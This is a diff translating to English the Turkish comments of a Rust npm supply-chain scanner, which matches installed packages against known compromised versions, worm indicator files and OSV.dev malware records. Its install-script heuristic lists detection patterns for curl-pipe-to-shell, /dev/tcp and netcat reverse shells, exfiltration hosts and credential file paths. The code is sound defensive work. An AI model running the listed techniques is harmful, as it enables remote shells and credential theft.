@@ -1,19 +1,21 @@
-//! npm tedarik zinciri taraması: kurulu paketler arasında zararlı olan var mı?
+//! npm supply chain scan: are any of the installed packages malicious?
 //!
-//! Üç bağımsız işaret aranır:
-//! 1. **Bilinen olaylar**: ele geçirilip zararlı sürüm yayımlanmış paketlerin
-//!    gömülü listesi (`KNOWN`). Ad + sürüm tam eşleşirse kesin bulgudur.
-//! 2. **İz dosyaları**: bilinen solucanların paket dizinine bıraktığı dosyalar.
-//! 3. **Şüpheli kurulum betikleri**: `preinstall` / `install` / `postinstall`
-//!    içinde indirip çalıştırma, kimlik bilgisi okuma gibi kalıplar. Bu
-//!    sezgiseldir; kesin hüküm değil, "bir göz at" uyarısıdır.
+//! Three independent signals are looked for:
+//! 1. **Known incidents**: an embedded list (`KNOWN`) of packages that were
+//!    compromised and had a malicious version published. An exact name +
+//!    version match is a definite finding.
+//! 2. **IOC files**: files that known worms drop into the package directory.
+//! 3. **Suspicious install scripts**: patterns such as download-and-execute
+//!    or reading credentials inside `preinstall` / `install` / `postinstall`.
+//!    This is heuristic; not a verdict, but a "take a look" warning.
 //!
-//! İsteğe bağlı dördüncü kaynak OSV.dev veritabanıdır (`--online`): kurulu
-//! paketlerin ad ve sürümleri sorgulanır, `MAL-` ile başlayan kayıtlar
-//! raporlanır. Gömülü liste zamanla eskir; güncel kapsam buradan gelir.
+//! An optional fourth source is the OSV.dev database (`--online`): the names
+//! and versions of installed packages are queried, and records starting with
+//! `MAL-` are reported. The embedded list goes stale over time; up-to-date
+//! coverage comes from here.
 //!
-//! Tarama salt okunurdur: yalnızca `package.json` dosyaları okunur, hiçbir
-//! paket kodu çalıştırılmaz.
+//! The scan is read-only: only `package.json` files are read, and no package
+//! code is ever executed.
 
 use crate::runner::CommandRunner;
 use colored::Colorize;
@@ -25,8 +27,9 @@ use std::io::Write as _;
 use std::path::{Path, PathBuf};
 use std::process::{Command, Stdio};
 
-/// Zararlı sürümü yayımlanmış bir paket. `versions` boşsa paketin tamamı
-/// zararlıdır (ör. yalnızca saldırı için açılmış yazım hatası paketleri).
+/// A package that had a malicious version published. If `versions` is empty
+/// the whole package is malicious (e.g. typosquat packages created solely
+/// for an attack).
 struct Incident {
     name: &'static str,
     versions: &'static [&'static str],
@@ -41,28 +44,28 @@ const fn incident(
     Incident { name, versions, note }
 }
 
-const CHALK_DEBUG: &str = "Eylül 2025 chalk/debug ele geçirilmesi (kripto cüzdan hırsızı)";
-const SCAVENGER: &str = "Temmuz 2025 oltalama ile ele geçirilme (Scavenger zararlısı)";
-const NX: &str = "Ağustos 2025 Nx 's1ngularity' (token ve cüzdan hırsızı)";
-const RSPACK: &str = "Aralık 2024 ele geçirilme (kripto madenci)";
-const TYPOSQUAT: &str = "yazım hatası tuzağı (ortam değişkenlerini çalar)";
+const CHALK_DEBUG: &str = "September 2025 chalk/debug compromise (crypto wallet stealer)";
+const SCAVENGER: &str = "July 2025 compromise via phishing (Scavenger malware)";
+const NX: &str = "August 2025 Nx 's1ngularity' (token and wallet stealer)";
+const RSPACK: &str = "December 2024 compromise (crypto miner)";
+const TYPOSQUAT: &str = "typosquat (steals environment variables)";
 
-/// Bilinen olaylar. Liste kapsamlı değildir; yaygın ve iyi belgelenmiş
-/// vakaları içerir. Güncel kapsam için `--online` kullanılır.
+/// Known incidents. The list is not exhaustive; it contains widespread and
+/// well-documented cases. Use `--online` for up-to-date coverage.
 const KNOWN: &[Incident] = &[
-    incident("event-stream", &["3.3.6"], "2018 flatmap-stream arka kapısı (cüzdan hırsızı)"),
-    incident("flatmap-stream", &[], "2018 event-stream saldırısının zararlı bağımlılığı"),
-    incident("eslint-scope", &["3.7.2"], "2018 npm token hırsızı"),
-    incident("eslint-config-eslint", &["5.0.2"], "2018 npm token hırsızı"),
-    incident("ua-parser-js", &["0.7.29", "0.8.0", "1.0.0"], "2021 ele geçirilme (madenci + parola hırsızı)"),
-    incident("coa", &["2.0.3", "2.0.4", "2.1.1", "2.1.3", "3.0.1", "3.1.3"], "2021 ele geçirilme (parola hırsızı)"),
-    incident("rc", &["1.2.9", "1.3.9", "2.3.9"], "2021 ele geçirilme (parola hırsızı)"),
-    incident("node-ipc", &["10.1.1", "10.1.2"], "2022 protestware (dosya silici)"),
-    incident("peacenotwar", &[], "2022 protestware (masaüstüne dosya yazar)"),
-    incident("colors", &["1.4.1", "1.4.2", "1.4.44-liberty-2"], "2022 sabotaj (sonsuz döngü)"),
-    incident("faker", &["6.6.6"], "2022 sabotaj (içi boşaltılmış sürüm)"),
-    incident("@solana/web3.js", &["1.95.6", "1.95.7"], "Aralık 2024 ele geçirilme (özel anahtar hırsızı)"),
-    incident("@lottiefiles/lottie-player", &["2.0.5", "2.0.6", "2.0.7"], "Ekim 2024 ele geçirilme (cüzdan boşaltıcı)"),
+    incident("event-stream", &["3.3.6"], "2018 flatmap-stream backdoor (wallet stealer)"),
+    incident("flatmap-stream", &[], "malicious dependency of the 2018 event-stream attack"),
+    incident("eslint-scope", &["3.7.2"], "2018 npm token stealer"),
+    incident("eslint-config-eslint", &["5.0.2"], "2018 npm token stealer"),
+    incident("ua-parser-js", &["0.7.29", "0.8.0", "1.0.0"], "2021 compromise (miner + password stealer)"),
+    incident("coa", &["2.0.3", "2.0.4", "2.1.1", "2.1.3", "3.0.1", "3.1.3"], "2021 compromise (password stealer)"),
+    incident("rc", &["1.2.9", "1.3.9", "2.3.9"], "2021 compromise (password stealer)"),
+    incident("node-ipc", &["10.1.1", "10.1.2"], "2022 protestware (file wiper)"),
+    incident("peacenotwar", &[], "2022 protestware (writes a file to the desktop)"),
+    incident("colors", &["1.4.1", "1.4.2", "1.4.44-liberty-2"], "2022 sabotage (infinite loop)"),
+    incident("faker", &["6.6.6"], "2022 sabotage (gutted release)"),
+    incident("@solana/web3.js", &["1.95.6", "1.95.7"], "December 2024 compromise (private key stealer)"),
+    incident("@lottiefiles/lottie-player", &["2.0.5", "2.0.6", "2.0.7"], "October 2024 compromise (wallet drainer)"),
     incident("@rspack/core", &["1.1.7"], RSPACK),
     incident("@rspack/cli", &["1.1.7"], RSPACK),
     incident(
@@ -70,7 +73,7 @@ const KNOWN: &[Incident] = &[
         &["2.13.3", "2.13.4", "2.13.5", "3.6.13", "3.6.14", "3.6.15", "4.9.11", "4.9.12", "4.9.13", "4.9.14"],
         RSPACK,
     ),
-    incident("xrpl", &["2.14.2", "4.2.1", "4.2.2", "4.2.3", "4.2.4"], "Nisan 2025 ele geçirilme (özel anahtar hırsızı)"),
+    incident("xrpl", &["2.14.2", "4.2.1", "4.2.2", "4.2.3", "4.2.4"], "April 2025 compromise (private key stealer)"),
     incident("eslint-config-prettier", &["8.10.1", "9.1.1", "10.1.6", "10.1.7"], SCAVENGER),
     incident("eslint-plugin-prettier", &["4.2.2", "4.2.3"], SCAVENGER),
     incident("synckit", &["0.11.9"], SCAVENGER),
@@ -102,89 +105,91 @@ const KNOWN: &[Incident] = &[
     incident("is-arrayish", &["0.3.3"], CHALK_DEBUG),
     incident("error-ex", &["1.3.3"], CHALK_DEBUG),
     incident("backslash", &["0.2.1"], CHALK_DEBUG),
-    incident("@ctrl/tinycolor", &["4.1.1", "4.1.2"], "Eylül 2025 Shai-Hulud solucanı (token hırsızı)"),
-    incident("axios", &["1.14.1", "0.30.4"], "Mart 2026 ele geçirilme (uzaktan erişim truva atı)"),
-    incident("plain-crypto-js", &[], "Mart 2026 axios saldırısının zararlı bağımlılığı"),
+    incident("@ctrl/tinycolor", &["4.1.1", "4.1.2"], "September 2025 Shai-Hulud worm (token stealer)"),
+    incident("axios", &["1.14.1", "0.30.4"], "March 2026 compromise (remote access trojan)"),
+    incident("plain-crypto-js", &[], "malicious dependency of the March 2026 axios attack"),
     incident("crossenv", &[], TYPOSQUAT),
     incident("cross-env.js", &[], TYPOSQUAT),
     incident("mongose", &[], TYPOSQUAT),
     incident("babelcli", &[], TYPOSQUAT),
-    incident("getcookies", &[], "2018 arka kapı"),
+    incident("getcookies", &[], "2018 backdoor"),
 ];
 
-/// Paket kökünde bulunması tek başına iz sayılan dosyalar.
+/// Files whose mere presence in the package root counts as an indicator.
 const IOC_FILES: &[(&str, &str)] = &[
-    ("setup_bun.js", "Shai-Hulud 2.0 solucanının yükleyici dosyası"),
-    ("bun_environment.js", "Shai-Hulud 2.0 solucanının yük dosyası"),
+    ("setup_bun.js", "loader file of the Shai-Hulud 2.0 worm"),
+    ("bun_environment.js", "payload file of the Shai-Hulud 2.0 worm"),
 ];
 
-/// Kurulum sırasında kendiliğinden çalışan betikler.
+/// Scripts that run automatically during installation.
 const LIFECYCLE: [&str; 3] = ["preinstall", "install", "postinstall"];
 
-/// Bu boyuttan büyük `package.json` okunmaz (olağan dosyalar birkaç KB'dir).
+/// A `package.json` larger than this is not read (ordinary files are a few KB).
 const MAX_MANIFEST_BYTES: u64 = 2 * 1024 * 1024;
 
-/// İç içe `node_modules` için özyineleme sınırı.
+/// Recursion limit for nested `node_modules`.
 const MAX_NESTING: usize = 40;
 
-/// Bir bulguda saklanan örnek konum sayısı.
+/// Number of sample locations kept per finding.
 const MAX_PATHS: usize = 3;
 
-/// Bulgunun türü. Sıralama önem sırasıdır (en ciddi önce).
+/// The kind of finding. Ordered by importance (most serious first).
 #[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize)]
 #[serde(rename_all = "kebab-case")]
 pub enum Kind {
-    /// Gömülü listedeki zararlı sürüm.
+    /// A malicious version from the embedded list.
     Known,
-    /// OSV.dev'de zararlı paket (`MAL-`) kaydı var.
+    /// OSV.dev has a malicious package (`MAL-`) record.
     Osv,
-    /// Bilinen bir zararlının bıraktığı dosya.
+    /// A file dropped by known malware.
     IocFile,
-    /// Şüpheli kurulum betiği (sezgisel).
+    /// Suspicious install script (heuristic).
     Script,
 }
 
 impl Kind {
-    /// Kesin bulgu mu (sezgisel uyarı değil)?
+    /// Is this a definite finding (not a heuristic warning)?
     pub fn is_malware(self) -> bool {
         self != Kind::Script
     }
 
     fn label(self) -> &'static str {
         match self {
-            Kind::Known => "ZARARLI SÜRÜM",
-            Kind::Osv => "OSV KAYDI",
-            Kind::IocFile => "İZ DOSYASI",
-            Kind::Script => "ŞÜPHELİ BETİK",
+            Kind::Known => "MALICIOUS VERSION",
+            Kind::Osv => "OSV RECORD",
+            Kind::IocFile => "IOC FILE",
+            Kind::Script => "SUSPICIOUS SCRIPT",
         }
     }
 }
 
-/// Tek bir bulgu. Aynı paket birçok projede kuruluysa tek bulguda toplanır.
+/// A single finding. If the same package is installed in many projects it is
+/// collapsed into one finding.
 #[derive(Debug, Clone, Serialize)]
 pub struct Finding {
     pub kind: Kind,
     pub package: String,
     pub version: String,
     pub reason: String,
-    /// Bulgunun görüldüğü kurulum sayısı.
+    /// Number of installs where the finding was seen.
     pub count: usize,
-    /// İlk birkaç konum.
+    /// The first few locations.
     pub paths: Vec<PathBuf>,
 }
 
-/// (ad, sürüm) → ilk görüldüğü dizin.
+/// (name, version) → the directory where it was first seen.
 pub type Installed = BTreeMap<(String, String), PathBuf>;
 
-/// Bir taramanın sonucu.
+/// The result of a scan.
 #[derive(Debug, Default, Serialize)]
 pub struct Scan {
     pub roots: Vec<PathBuf>,
-    /// İncelenen paket kurulumu sayısı (aynı paket farklı yerlerde ayrı sayılır).
+    /// Number of package installs inspected (the same package in different
+    /// places is counted separately).
     pub packages: usize,
     pub findings: Vec<Finding>,
-    /// Görülen benzersiz (ad, sürüm) çiftleri ve ilk görüldükleri konum;
-    /// OSV sorgusu için.
+    /// The unique (name, version) pairs seen and where each was first seen;
+    /// for the OSV query.
     #[serde(skip)]
     pub installed: Installed,
 }
@@ -198,8 +203,8 @@ impl Scan {
         self.findings.iter().filter(|finding| !finding.kind.is_malware())
     }
 
-    /// OSV sonuçlarını bulgulara ekler. Gömülü listenin zaten yakaladığı
-    /// paketler yinelenmez.
+    /// Adds OSV results to the findings. Packages already caught by the
+    /// embedded list are not duplicated.
     pub fn add_osv(&mut self, hits: Vec<OsvHit>) {
         for hit in hits {
             let already_known = self.findings.iter().any(|finding| {
@@ -213,7 +218,7 @@ impl Scan {
             let key = (hit.package, hit.version);
             self.findings.push(Finding {
                 kind: Kind::Osv,
-                reason: format!("OSV zararlı paket kaydı: {}", hit.ids.join(", ")),
+                reason: format!("OSV malicious package record: {}", hit.ids.join(", ")),
                 package: key.0.clone(),
                 version: key.1.clone(),
                 count: 1,
@@ -225,9 +230,9 @@ impl Scan {
     }
 }
 
-// ---- Tarama ----
+// ---- Scanning ----
 
-/// Verilen `node_modules` dizinlerini tarar.
+/// Scans the given `node_modules` directories.
 pub fn scan(roots: &[PathBuf]) -> Scan {
     let mut scanner = Scanner::default();
     for root in roots {
@@ -255,8 +260,9 @@ pub fn scan(roots: &[PathBuf]) -> Scan {
     }
 }
 
-/// (tür, paket, sürüm, neden) → (kurulum sayısı, örnek konumlar).
-/// `BTreeMap` anahtara göre sıralı tutar: bulgular önem sırasıyla çıkar.
+/// (kind, package, version, reason) → (install count, sample locations).
+/// `BTreeMap` keeps entries sorted by key: findings come out in order of
+/// importance.
 type Hits = BTreeMap<(Kind, String, String, String), (usize, Vec<PathBuf>)>;
 
 #[derive(Default)]
@@ -267,18 +273,18 @@ struct Scanner {
 }
 
 impl Scanner {
-    /// Bir `node_modules` dizinindeki paketleri dolaşır.
+    /// Walks the packages in a `node_modules` directory.
     fn node_modules(&mut self, dir: &Path, depth: usize) {
         for (name, path) in subdirs(dir) {
             if name == ".pnpm" {
-                // pnpm deposu: `.pnpm/<ad>@<sürüm>/node_modules/<paket>`
+                // pnpm store: `.pnpm/<name>@<version>/node_modules/<package>`
                 for (_, store_entry) in subdirs(&path) {
                     self.node_modules(&store_entry.join("node_modules"), depth);
                 }
             } else if name.starts_with('.') {
-                // `.bin`, `.cache`, `.package-lock.json` vb.
+                // `.bin`, `.cache`, `.package-lock.json`, etc.
             } else if name.starts_with('@') {
-                // Kapsamlı paketler bir alt düzeydedir: `@scope/ad`
+                // Scoped packages live one level down: `@scope/name`
                 for (_, scoped) in subdirs(&path) {
                     self.package(&scoped, depth);
                 }
@@ -288,7 +294,8 @@ impl Scanner {
         }
     }
 
-    /// Tek bir paket dizinini inceler, sonra kendi `node_modules`'ına iner.
+    /// Inspects a single package directory, then descends into its own
+    /// `node_modules`.
     fn package(&mut self, dir: &Path, depth: usize) {
         if let Some(manifest) = read_manifest(&dir.join("package.json")) {
             self.inspect(dir, &manifest);
@@ -302,7 +309,7 @@ impl Scanner {
         let text = |key: &str| manifest.get(key).and_then(Value::as_str).unwrap_or_default();
         let (name, version) = (text("name"), text("version"));
         if name.is_empty() {
-            // Paket içindeki yardımcı `package.json` dosyaları (ör. `{"type":"module"}`).
+            // Helper `package.json` files inside a package (e.g. `{"type":"module"}`).
             return;
         }
         self.packages += 1;
@@ -341,16 +348,17 @@ impl Scanner {
     }
 }
 
-/// Dizinin alt dizinlerini (ad, yol) olarak sıralı döndürür. Sembolik
-/// bağlantılar izlenmez: pnpm'in bağlantıları zaten `.pnpm` altında taranır
-/// ve döngüye girme riski kalmaz. Okunamayan dizinler boş sayılır.
+/// Returns the directory's subdirectories as sorted (name, path) pairs.
+/// Symbolic links are not followed: pnpm's links are already scanned under
+/// `.pnpm`, and this removes any risk of looping. Unreadable directories
+/// count as empty.
 fn subdirs(dir: &Path) -> Vec<(String, PathBuf)> {
     let Ok(entries) = std::fs::read_dir(dir) else {
         return Vec::new();
     };
     let mut dirs: Vec<(String, PathBuf)> = entries
         .filter_map(Result::ok)
-        // `DirEntry::file_type` bağlantıyı izlemez; bağlantılar burada elenir.
+        // `DirEntry::file_type` does not follow links; links are filtered out here.
         .filter(|entry| entry.file_type().is_ok_and(|kind| kind.is_dir()))
         .map(|entry| (entry.file_name().to_string_lossy().into_owned(), entry.path()))
         .collect();
@@ -366,7 +374,7 @@ fn read_manifest(path: &Path) -> Option<Value> {
     serde_json::from_str(&std::fs::read_to_string(path).ok()?).ok()
 }
 
-/// Paket ve sürüm bilinen bir olayla eşleşiyorsa açıklamasını döndürür.
+/// Returns the description if the package and version match a known incident.
 fn known_incident(name: &str, version: &str) -> Option<&'static str> {
     KNOWN
         .iter()
@@ -377,27 +385,27 @@ fn known_incident(name: &str, version: &str) -> Option<&'static str> {
         .map(|incident| incident.note)
 }
 
-/// Kurulum betiği şüpheli görünüyorsa nedenini döndürür.
+/// Returns the reason if the install script looks suspicious.
 ///
-/// Kurulum betiğinin varlığı tek başına şüpheli değildir (esbuild, sharp
-/// gibi pek çok paket ikili dosya indirmek için kullanır); burada yalnızca
-/// meşru bir kurulumda görülmesi beklenmeyen kalıplar aranır.
+/// The mere existence of an install script is not suspicious (many packages
+/// such as esbuild and sharp use one to download binaries); only patterns
+/// that would not be expected in a legitimate install are looked for here.
 fn script_suspicion(script: &str) -> Option<&'static str> {
     let lower = script.to_lowercase();
     let has = |patterns: &[&str]| patterns.iter().any(|pattern| lower.contains(pattern));
 
     let downloads = has(&["curl ", "wget "]);
     if downloads && has(&["| sh", "|sh", "| bash", "|bash", "| zsh", "|zsh"]) {
-        return Some("indirdiği betiği doğrudan çalıştırıyor");
+        return Some("directly executes a script it downloads");
     }
     if has(&["/dev/tcp/", "nc -e ", "ncat -e "]) {
-        return Some("ters kabuk (reverse shell) kalıbı içeriyor");
+        return Some("contains a reverse shell pattern");
     }
     if lower.contains("base64") && has(&[" -d", "--decode"]) {
-        return Some("base64 ile gizlenmiş komut çalıştırıyor");
+        return Some("runs a command obfuscated with base64");
     }
     if has(&["setup_bun.js", "bun_environment.js"]) {
-        return Some("Shai-Hulud 2.0 solucanının yükleyicisini çalıştırıyor");
+        return Some("runs the loader of the Shai-Hulud 2.0 worm");
     }
     if has(&[
         "webhook.site",
@@ -410,35 +418,35 @@ fn script_suspicion(script: &str) -> Option<&'static str> {
         "interact.sh",
         "ngrok",
     ]) {
-        return Some("veri sızdırmada kullanılan bir adrese bağlanıyor");
+        return Some("connects to an address used for data exfiltration");
     }
     if has(&[".ssh/", ".npmrc", ".aws/", "/etc/passwd", "login.keychain", "id_rsa"]) {
-        return Some("kimlik bilgisi dosyalarına erişiyor");
+        return Some("accesses credential files");
     }
     if has(&["node -e", "node --eval"]) && has(&["child_process", "eval(", "http"]) {
-        return Some("satır içi kodla komut çalıştırıyor ya da ağa çıkıyor");
+        return Some("runs a command or reaches the network with inline code");
     }
     if lower.contains("osascript") {
-        return Some("osascript ile sistem komutu çalıştırıyor");
+        return Some("runs a system command via osascript");
     }
     None
 }
 
-// ---- Taranacak dizinlerin bulunması ----
+// ---- Finding the directories to scan ----
 
 fn home() -> Option<PathBuf> {
     std::env::var_os("HOME").map(PathBuf::from)
 }
 
-/// Genel (global) kurulum dizinleri: npm, pnpm, yarn, bun, sürüm
-/// yöneticileri ve `npx` önbelleği. Yalnızca var olanlar döner.
+/// Global install directories: npm, pnpm, yarn, bun, version managers and
+/// the `npx` cache. Only the ones that exist are returned.
 pub fn global_roots(runner: &dyn CommandRunner) -> Vec<PathBuf> {
     let mut candidates: Vec<PathBuf> = vec![
         PathBuf::from("/opt/homebrew/lib/node_modules"),
         PathBuf::from("/usr/local/lib/node_modules"),
     ];
 
-    // Özel bir `prefix` ayarlandıysa yukarıdaki sabit yollar yetmez.
+    // If a custom `prefix` is set, the fixed paths above are not enough.
     if let Ok(out) = runner.run("npm", &["root", "-g"])
         && out.success
         && !out.stdout.is_empty()
@@ -447,7 +455,7 @@ pub fn global_roots(runner: &dyn CommandRunner) -> Vec<PathBuf> {
     }
 
     if let Some(home) = home() {
-        // `*` tek bir dizin düzeyini (ör. Node sürümünü) temsil eder.
+        // `*` stands for a single directory level (e.g. the Node version).
         const PATTERNS: [&str; 14] = [
             ".npm-global/lib/node_modules",
             ".npm/_npx/*/node_modules",
@@ -472,20 +480,22 @@ pub fn global_roots(runner: &dyn CommandRunner) -> Vec<PathBuf> {
     unique_dirs(candidates)
 }
 
-/// Genel dizinler + ev dizinindeki projelerin `node_modules` dizinleri.
+/// Global directories + the `node_modules` directories of projects in the
+/// home directory.
 pub fn all_roots(runner: &dyn CommandRunner) -> Vec<PathBuf> {
     let mut roots = global_roots(runner);
     if let Some(home) = home() {
-        // Ev dizininin kökündeki bu klasörlerde proje aranmaz: büyüktürler
-        // ve Library altındaki genel dizinler yukarıda zaten eklendi.
+        // Projects are not searched for in these folders at the root of the
+        // home directory: they are large, and the global directories under
+        // Library were already added above.
         const SKIP: [&str; 6] = ["Library", "Applications", "Music", "Movies", "Pictures", "Public"];
         roots.extend(find_node_modules(&home, &SKIP));
     }
     unique_dirs(roots)
 }
 
-/// Kullanıcının verdiği yolu tarama köklerine çevirir: yol bir
-/// `node_modules` ise kendisi, değilse altındaki tüm `node_modules` dizinleri.
+/// Turns a user-supplied path into scan roots: the path itself if it is a
+/// `node_modules`, otherwise every `node_modules` directory beneath it.
 pub fn roots_under(path: &Path) -> Vec<PathBuf> {
     if path.file_name().is_some_and(|name| name == "node_modules") {
         return vec![path.to_path_buf()];
@@ -493,11 +503,12 @@ pub fn roots_under(path: &Path) -> Vec<PathBuf> {
     find_node_modules(path, &[])
 }
 
-/// `base` altında `node_modules` dizinlerini arar. Bulunan dizinin içine
-/// inilmez (iç içe olanları tarayıcı kendisi dolaşır); gizli dizinler ve
-/// sembolik bağlantılar atlanır.
+/// Searches for `node_modules` directories under `base`. A found directory
+/// is not descended into (the scanner walks nested ones itself); hidden
+/// directories and symbolic links are skipped.
 fn find_node_modules(base: &Path, skip_top: &[&str]) -> Vec<PathBuf> {
-    /// Ev dizininden başlayınca monorepo alt paketlerine yetecek derinlik.
+    /// Deep enough to reach monorepo sub-packages when starting from the
+    /// home directory.
     const MAX_DEPTH: usize = 9;
 
     fn walk(dir: &Path, depth: usize, skip: &[&str], found: &mut Vec<PathBuf>) {
@@ -505,7 +516,7 @@ fn find_node_modules(base: &Path, skip_top: &[&str]) -> Vec<PathBuf> {
             if name == "node_modules" {
                 found.push(path);
             } else if !name.starts_with('.') && !skip.contains(&name.as_str()) && depth < MAX_DEPTH {
-                // Atlama listesi yalnızca en üst düzey için geçerlidir.
+                // The skip list applies only to the top level.
                 walk(&path, depth + 1, &[], found);
             }
         }
@@ -516,7 +527,7 @@ fn find_node_modules(base: &Path, skip_top: &[&str]) -> Vec<PathBuf> {
     found
 }
 
-/// `a/*/b` biçimindeki deseni `base` altında var olan yollara açar.
+/// Expands a pattern of the form `a/*/b` into existing paths under `base`.
 fn expand(base: &Path, pattern: &str) -> Vec<PathBuf> {
     let mut paths = vec![base.to_path_buf()];
     for part in pattern.split('/') {
@@ -531,7 +542,7 @@ fn expand(base: &Path, pattern: &str) -> Vec<PathBuf> {
     paths
 }
 
-/// Var olan dizinleri gerçek yollarına çevirip yinelenenleri eler.
+/// Resolves existing directories to their real paths and drops duplicates.
 fn unique_dirs(candidates: Vec<PathBuf>) -> Vec<PathBuf> {
     let unique: BTreeSet<PathBuf> = candidates
         .into_iter()
@@ -541,13 +552,13 @@ fn unique_dirs(candidates: Vec<PathBuf>) -> Vec<PathBuf> {
     unique.into_iter().collect()
 }
 
-// ---- OSV.dev sorgusu (--online) ----
+// ---- OSV.dev query (--online) ----
 
 const OSV_URL: &str = "https://api.osv.dev/v1/querybatch";
-/// OSV tek istekte en çok 1000 sorgu kabul eder.
+/// OSV accepts at most 1000 queries per request.
 const OSV_BATCH: usize = 1000;
 
-/// OSV'de zararlı paket kaydı bulunan bir kurulu sürüm.
+/// An installed version that has a malicious package record in OSV.
 #[derive(Debug, PartialEq, Eq)]
 pub struct OsvHit {
     pub package: String,
@@ -555,10 +566,10 @@ pub struct OsvHit {
     pub ids: Vec<String>,
 }
 
-/// Kurulu paketleri OSV.dev'e sorar. Dışarıya yalnızca paket adları ve
-/// sürümleri gönderilir; dosya yolları ya da içerik gönderilmez.
+/// Queries OSV.dev about the installed packages. Only package names and
+/// versions are sent out; no file paths or contents are sent.
 pub fn osv_lookup(installed: &Installed) -> Result<Vec<OsvHit>, String> {
-    // Sürümü olmayan (ör. git'ten kurulmuş) paketler sorgulanamaz.
+    // Packages without a version (e.g. installed from git) cannot be queried.
     let packages: Vec<&(String, String)> = installed
         .keys()
         .filter(|(_, version)| !version.is_empty())
@@ -585,18 +596,19 @@ fn osv_request(packages: &[&(String, String)]) -> String {
     serde_json::json!({ "queries": queries }).to_string()
 }
 
-/// Yanıttaki `results` dizisi sorgularla aynı sıradadır. Güvenlik açığı
-/// (GHSA/CVE) kayıtları kapsam dışıdır; yalnızca `MAL-` kayıtları alınır.
+/// The `results` array in the response is in the same order as the queries.
+/// Vulnerability (GHSA/CVE) records are out of scope; only `MAL-` records
+/// are kept.
 fn parse_osv(response: &str, packages: &[&(String, String)]) -> Result<Vec<OsvHit>, String> {
     let parsed: Value =
-        serde_json::from_str(response).map_err(|err| format!("OSV yanıtı okunamadı: {err}"))?;
+        serde_json::from_str(response).map_err(|err| format!("could not parse OSV response: {err}"))?;
     let results = parsed
         .get("results")
         .and_then(Value::as_array)
-        .ok_or("OSV yanıtında `results` alanı yok")?;
+        .ok_or("OSV response has no `results` field")?;
     if results.len() != packages.len() {
         return Err(format!(
-            "OSV {} sorguya {} yanıt döndürdü",
+            "OSV returned {1} results for {0} queries",
             packages.len(),
             results.len()
         ));
@@ -624,8 +636,9 @@ fn parse_osv(response: &str, packages: &[&(String, String)]) -> Result<Vec<OsvHi
     Ok(hits)
 }
 
-/// `curl` ile JSON gönderir. Gövde argüman yerine stdin'den verilir:
-/// binlerce paketlik istek komut satırı uzunluk sınırını aşabilir.
+/// Sends JSON with `curl`. The body is passed via stdin rather than as an
+/// argument: a request covering thousands of packages could exceed the
+/// command line length limit.
 fn post_json(url: &str, body: &str) -> Result<String, String> {
     let mut child = Command::new("curl")
         .args([
@@ -644,34 +657,34 @@ fn post_json(url: &str, body: &str) -> Result<String, String> {
         .stdout(Stdio::piped())
         .stderr(Stdio::piped())
         .spawn()
-        .map_err(|err| format!("`curl` çalıştırılamadı: {err}"))?;
+        .map_err(|err| format!("could not run `curl`: {err}"))?;
 
-    // stdin'i yazıp kapatıyoruz (`take` + kapsam sonu) ki curl girdinin
-    // bittiğini anlasın.
+    // We write stdin and close it (`take` + end of scope) so that curl
+    // knows the input has ended.
     if let Some(mut stdin) = child.stdin.take() {
         stdin
             .write_all(body.as_bytes())
-            .map_err(|err| format!("istek gönderilemedi: {err}"))?;
+            .map_err(|err| format!("could not send request: {err}"))?;
     }
 
     let output = child
         .wait_with_output()
-        .map_err(|err| format!("`curl` beklenemedi: {err}"))?;
+        .map_err(|err| format!("could not wait for `curl`: {err}"))?;
     if !output.status.success() {
         return Err(String::from_utf8_lossy(&output.stderr).trim().to_string());
     }
     Ok(String::from_utf8_lossy(&output.stdout).into_owned())
 }
 
-// ---- Rapor (--npm) ----
+// ---- Report (--npm) ----
 
-/// `--npm` modunun çıktısı.
+/// Output of the `--npm` mode.
 #[derive(Debug, Serialize)]
 pub struct NpmReport {
     pub tool: &'static str,
     pub version: &'static str,
     pub timestamp: String,
-    /// OSV sorgusu yapıldı mı?
+    /// Was the OSV query performed?
     pub online: bool,
     #[serde(flatten)]
     pub scan: Scan,
@@ -689,7 +702,7 @@ impl NpmReport {
     }
 
     pub fn to_json(&self) -> String {
-        serde_json::to_string_pretty(self).expect("rapor JSON'a çevrilebilir")
+        serde_json::to_string_pretty(self).expect("report is serializable to JSON")
     }
 
     pub fn to_text(&self) -> String {
@@ -697,16 +710,16 @@ impl NpmReport {
         let rule = "─".repeat(78).dimmed();
         let scan = &self.scan;
         let source = if self.online {
-            "gömülü liste + OSV.dev"
+            "embedded list + OSV.dev"
         } else {
-            "gömülü liste (güncel kayıtlar için --online)"
+            "embedded list (use --online for up-to-date records)"
         };
 
         let _ = writeln!(out);
-        let _ = writeln!(out, "{}", " npm Zararlı Paket Taraması ".on_blue().white().bold());
+        let _ = writeln!(out, "{}", " npm Malicious Package Scan ".on_blue().white().bold());
         let _ = writeln!(
             out,
-            " {} dizin · {} paket kurulumu ({} benzersiz sürüm) · {}",
+            " {} directories · {} package installs ({} unique versions) · {}",
             scan.roots.len(),
             scan.packages,
             scan.installed.len(),
@@ -734,7 +747,7 @@ impl NpmReport {
             }
             if finding.count > finding.paths.len() && !finding.paths.is_empty() {
                 let more = finding.count - finding.paths.len();
-                let _ = writeln!(out, "    {}", format!("… ve {more} konum daha").dimmed());
+                let _ = writeln!(out, "    {}", format!("… and {more} more locations").dimmed());
             }
         }
 
@@ -746,28 +759,28 @@ impl NpmReport {
             let _ = writeln!(
                 out,
                 "{}",
-                format!("{malware} zararlı paket bulundu.").red().bold()
+                format!("{malware} malicious packages found.").red().bold()
             );
             let _ = writeln!(
                 out,
-                "Paketi kaldır ya da temiz sürüme geç, `node_modules`'ı silip yeniden kur ve\n\
-                 bu makinedeki npm / GitHub / bulut anahtarlarını ve parolaları yenile."
+                "Remove the package or move to a clean version, delete and reinstall `node_modules`,\n\
+                 and rotate the npm / GitHub / cloud keys and passwords on this machine."
             );
         } else {
-            let _ = writeln!(out, "{}", "Bilinen zararlı paket bulunmadı.".green().bold());
+            let _ = writeln!(out, "{}", "No known malicious packages found.".green().bold());
         }
         if suspicious > 0 {
             let _ = writeln!(
                 out,
                 "{}",
                 format!(
-                    "{suspicious} şüpheli kurulum betiği: sezgisel uyarıdır, betiği okuyup karar ver."
+                    "{suspicious} suspicious install scripts: this is a heuristic warning, read the script and decide."
                 )
                 .yellow()
             );
         }
         if scan.roots.is_empty() {
-            let _ = writeln!(out, "{}", "Taranacak node_modules dizini bulunamadı.".dimmed());
+            let _ = writeln!(out, "{}", "No node_modules directory found to scan.".dimmed());
         }
         out.trim_end().to_string()
